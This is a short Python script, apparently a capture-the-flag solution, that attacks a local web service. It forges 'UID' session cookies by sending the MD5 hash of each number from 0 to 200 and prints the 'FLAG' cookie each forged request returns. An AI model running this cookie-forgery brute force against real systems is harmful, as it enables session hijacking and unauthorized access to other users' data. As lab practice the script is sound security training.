import hashlib
import codecs
import numpy as np
import requests
import urllib.parse

#IP
ip = "127.0.0.1"
port= "8080"

url = f"http://{ip}:{port}/"

response = requests.get(url)

#print(response.cookies)

uid = response.cookies.get('UID')

print(f"UID: {uid}")

control = uid
tester = 100
tester_b = str.encode(str(tester))
tester_md5 = hashlib.md5(tester_b).hexdigest()
print(f"tester={tester_md5 == control}")

cookies = {
    'UID': uid
}

response = requests.get(url, cookies=cookies)

flag = urllib.parse.unquote(response.cookies.get('FLAG'))

print(f"FLAG: {flag}")

for i in range(tester-100, tester+100+1):
    byte_string = str.encode(str(i))
    hex_hash = hashlib.md5(byte_string).hexdigest()

    cookies = {
        'UID': hex_hash
    }

    response = requests.get(url, cookies=cookies)

    flag = urllib.parse.unquote(response.cookies.get('FLAG'))

    print(f"Step {i} - FLAG: {flag}")